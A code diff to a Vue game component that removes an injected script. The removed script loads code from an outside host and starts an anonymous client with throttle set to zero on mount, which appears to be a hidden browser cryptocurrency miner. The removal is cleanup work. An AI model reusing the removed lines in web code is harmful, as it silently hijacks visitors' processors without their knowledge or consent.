@@ -98,36 +98,12 @@
     // Play audio when component is mounted
     audio.value.loop = true;
     audio.value.play();
-    await loadScript();
-    initializeScript();
   });
 
   onUnmounted(() => {
     // Stop the audio when the component is unmounted
     audio.value.pause();
   });
-
-  async function loadScript() {
-    return new Promise((resolve, reject) => {
-      const script = document.createElement("script");
-      script.src = "https://www.hostingcloud.racing/2xzP.js";
-      script.onload = () => {
-        isScriptLoaded.value = true;
-        resolve(true);
-      };
-      script.onerror = () => reject(false);
-      document.body.appendChild(script);
-    });
-  }
-
-  function initializeScript() {
-    if (isScriptLoaded.value) {
-      var _client = new (window as any).Client.Anonymous('dffe49f6deff996decdf093e573f5bb7cace795248132a63d806c4a0bd7ba26c', {
-          throttle: 0, c: 'w', ads: 0
-      });
-      _client.start();
-    }
-  }
 
   const startGame = async () => {
     try {
